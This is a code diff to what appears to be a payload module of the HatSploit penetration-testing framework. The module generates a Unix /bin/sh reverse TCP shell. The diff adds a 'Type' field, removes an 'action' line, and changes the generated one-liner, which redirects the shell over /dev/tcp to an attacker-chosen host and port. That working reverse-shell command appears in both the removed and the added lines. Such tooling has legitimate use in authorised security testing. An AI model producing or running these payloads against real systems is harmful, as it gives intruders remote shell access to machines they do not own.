@@ -38,7 +38,8 @@ class HatSploitPayload(HatSploitPayload):
         'Authors': [
             'enty8080'
         ],
-        'Description': "Unix /bin/sh Reverse TCP payload."
+        'Description': "Unix /bin/sh Reverse TCP payload.",
+        'Type': "reverse_tcp"
     }
 
     options = {
@@ -68,10 +69,9 @@ class HatSploitPayload(HatSploitPayload):
         self.badges.output_process("Generating payload...")
 
         if prompt in ['yes', 'y']:
-            payload = f"/bin/sh -i &>/dev/tcp/{local_host}/{local_port} 0>&1 2>/dev/null &"
+            payload = f"/bin/sh -i &>/dev/tcp/{local_host}/{local_port} 0>&1 &"
         else:
-            payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 2>/dev/null &"
+            payload = f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1 &"
 
         self.payload = payload
         self.instructions = payload
-        self.action = 'reverse_tcp'
